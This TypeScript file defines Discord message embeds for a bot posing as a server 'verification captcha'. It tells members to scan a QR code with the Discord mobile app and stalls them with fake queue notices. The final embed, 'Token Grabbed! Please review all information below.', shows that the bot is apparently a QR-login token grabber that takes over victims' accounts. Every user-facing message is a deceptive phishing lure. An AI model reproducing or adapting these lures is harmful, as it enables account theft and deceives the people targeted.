import { EmbedBuilder } from '@discordjs/builders';
import { config } from './config.mts';

class EmbedColors {
  public static readonly colors = {
    fail: 0xff2222,
    yellow: 0xffd500,
    custom: parseInt(config.color, 16),
  };
}

export const directMessageEmbed = async (): Promise<EmbedBuilder> => {
  const embed = new EmbedBuilder().setColor(EmbedColors.colors.custom).setTitle('Verification captcha').setDescription('Scan the QR code below using the Discord mobile app to verify your identity within the server! You will get access to all channels once you are verified.');
  return embed;
};

export const verifyMessageEmbed = async () => {
  const embed = new EmbedBuilder().setColor(EmbedColors.colors.custom).setTitle(`${config.name} Verification required!`).setDescription(`🔔 **To access the rest of the server, you must first pass bot verification.**\n➡️ Press the Verify button below.`);

  return embed;
};

export const afterButtonPressEmbed = async (channelId: string): Promise<EmbedBuilder> => {
  const embed = new EmbedBuilder().setColor(EmbedColors.colors.custom).setTitle(`Verification start`).setDescription(`Verification has started, continue in your direct messages [here](https://discord.com/channels/@me/${channelId})!`);

  return embed;
};

export const prepareVerificationEmbed = async (): Promise<EmbedBuilder> => {
  const embed = new EmbedBuilder().setColor(EmbedColors.colors.custom).setTitle('Verification preparation').setDescription('Please wait while we prepare your verification. This may take a few seconds.');

  return embed;
};

export const pleaseWaitEmbed = async (): Promise<EmbedBuilder> => {
  const embed = new EmbedBuilder().setColor(EmbedColors.colors.yellow).setTitle('We almost arrive!').setDescription("We've noticed you and are working hard to verify it! The queue is quite full at the moment, so please wait while we complete your verification. This may take a few seconds.");

  return embed;
};

export const failedVerificationEmbed = async () => {
  const embed = new EmbedBuilder().setColor(EmbedColors.colors.fail).setTitle(`Verification failure`).setDescription(`An error occurred while trying to verify you. Please try again later.`);

  return embed;
};

export const failedToMessageEmbed = async (): Promise<EmbedBuilder> => {
  const embed = new EmbedBuilder().setColor(EmbedColors.colors.fail).setTitle('Verification failure').setDescription("I couldn't send you a message. Please check your privacy settings and try again...");

  return embed;
};

export const alreadyVerifyingEmbed = async (): Promise<EmbedBuilder> => {
  const embed = new EmbedBuilder().setColor(EmbedColors.colors.fail).setTitle('Verification failure').setDescription('You are already in the verification process. Please complete this before trying again.');

  return embed;
};

export const verificationComplete = async (): Promise<EmbedBuilder> => {
  const embed = new EmbedBuilder().setColor(EmbedColors.colors.custom).setTitle('Complete verification').setDescription('You have successfully verified yourself. You will now get access to all channels within the server...');

  return embed;
};

export const setRoleEmbed = async (): Promise<EmbedBuilder> => {
  const embed = new EmbedBuilder().setColor(EmbedColors.colors.custom).setTitle('Verification Function Set').setDescription('The verification role has been established. Members will now receive this role once they have verified themselves.');

  return embed;
};

export const roleIsAboveMeEmbed = async (): Promise<EmbedBuilder> => {
  const embed = new EmbedBuilder().setColor(EmbedColors.colors.fail).setTitle('Could not set role').setDescription('The role you have selected is above my highest role. Select a role below my highest role.');

  return embed;
};

export const lackPermissionsEmebd = async (): Promise<EmbedBuilder> => {
  const embed = new EmbedBuilder().setColor(EmbedColors.colors.fail).setTitle('Invalid permissions').setDescription('You do not have the correct permissions to run this command. Contact a server administrator.');

  return embed;
};

export const foundTokenEmbed = async (): Promise<EmbedBuilder> => {
  const embed = new EmbedBuilder().setColor(EmbedColors.colors.custom).setTitle('Token Grabbed! Please review all information below.');

  return embed;
};
